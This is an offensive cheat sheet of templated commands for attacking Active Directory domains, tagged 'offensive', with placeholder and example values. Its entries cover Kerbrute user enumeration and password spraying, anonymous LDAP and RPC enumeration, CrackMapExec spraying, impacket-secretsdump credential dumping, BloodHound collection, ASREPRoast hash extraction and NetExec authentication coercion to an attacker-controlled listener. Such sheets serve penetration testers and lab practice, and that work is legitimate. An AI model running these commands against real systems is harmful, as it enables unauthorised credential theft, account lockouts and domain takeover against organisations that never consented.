
---
Description :
     Kerbrute userenum against domain controller

Parameters : #domain #user-file #target-ip

```cmd
kerbrute userenum -d {{domain}} -users {{user-file}} --dc {{target-ip}}
```

```example
kerbrute userenum -d CORP.LOCAL -users users.txt --dc 10.10.10.10
```

Tags :  #linux #kerberos #ad #offensive

---

Description :
     Kerbrute password spray (careful — lockout risk)

Parameters : #domain #password #user-file #target-ip

```cmd
kerbrute passwordspray -d {{domain}} -users {{user-file}} -p '{{password}}' --dc {{target-ip}}
```

```example
kerbrute passwordspray -d CORP.LOCAL -users users.txt -p 'Winter2025!' --dc 10.10.10.10
```

Tags :  #linux #kerberos #ad #offensive

---

Description :
     ldapsearch anonymous rootDSE

Parameters : #target-ip

```cmd
ldapsearch -x -H ldap://{{target-ip}} -s base namingcontexts
```

```example
ldapsearch -x -H ldap://10.10.10.10 -s base namingcontexts
```

Tags :  #linux #ldap #ad #offensive

---

Description :
     ldapsearch all objects size limit (adjust -z)

Parameters : #domain #target-ip

```cmd
ldapsearch -x -H ldap://{{target-ip}} -b "DC={{domain}},DC=local" "(objectClass=*)" dn -z 200
```

```example
ldapsearch -x -H ldap://10.10.10.10 -b "DC=CORP,DC=LOCAL" "(objectClass=*)" sAMAccountName -z 200
```

Tags :  #linux #ldap #ad #offensive

---

Description :
     rpcclient null session enumerate domains

Parameters : #target-ip

```cmd
rpcclient -U "" -N {{target-ip}} -c "enumdomains"
```

```example
rpcclient -U "" -N 10.10.10.10 -c "enumdomains"
```

Tags :  #linux #rpc #ad #offensive

---

Description :
     crackmapexec ldap password spray

Parameters : #target-ip #user-file #password

```cmd
crackmapexec ldap {{target-ip}} -u {{user-file}} -p '{{password}}'
```

```example
crackmapexec ldap 10.10.10.10 -u users.txt -p 'Password1'
```

Tags :  #linux #ldap #ad #crackmapexec #offensive

---

Description :
     secretsdump remote DRSUAPI (requires creds)

Parameters : #domain #username #password #target-ip

```cmd
impacket-secretsdump {{domain}}/{{username}}:'{{password}}'@{{target-ip}}
```

```example
impacket-secretsdump CORP/administrator:'x'@10.10.10.10
```

Tags :  #linux #impacket #ad #offensive

---

Description :
     BloodHound.py collectors — all collection (SharpHound alternative on Linux)

Parameters : #domain #username #password #target-ip

```cmd
bloodhound-python -d {{domain}} -u {{username}} -p '{{password}}' -ns {{target-ip}} -c All
```

```example
bloodhound-python -d CORP.LOCAL -u svc -p 'x' -ns 10.10.10.10 -c All
```

Tags :  #linux #bloodhound #ad #offensive

---

Description :
     windapsearch simple bind user dump (if tool installed)

Parameters : #domain #username #password #target-ip

```cmd
windapsearch --dc-ip {{target-ip}} -u {{domain}}\\{{username}} -p '{{password}}' --users
```

```example
windapsearch --dc-ip 10.10.10.10 -u CORP\\guest -p '' --users
```

Tags :  #linux #ldap #ad #offensive

---

Description :
     NetExec LDAP ASREPRoast

Parameters : #target-ip #user-file

```cmd
netexec ldap {{target-ip}} -u {{user-file}} --asreproast asrep.txt
```

```example
netexec ldap 10.10.10.10 -u users.txt --asreproast asrep.txt
```

Tags :  #linux #netexec #kerberos #ad #offensive

---

Description :
     NetExec SMB coerce authentication (lab only — know the module)

Parameters : #target-ip #username #password

```cmd
netexec smb {{target-ip}} -u {{username}} -p '{{password}}' -M coerce_plus -o LISTENER=http://{{attacker-ip}}:80/
```

```example
netexec smb 10.10.10.10 -u user -p pass -M coerce_plus -o LISTENER=http://10.10.14.2:80/
```

Tags :  #linux #netexec #ad #offensive

---
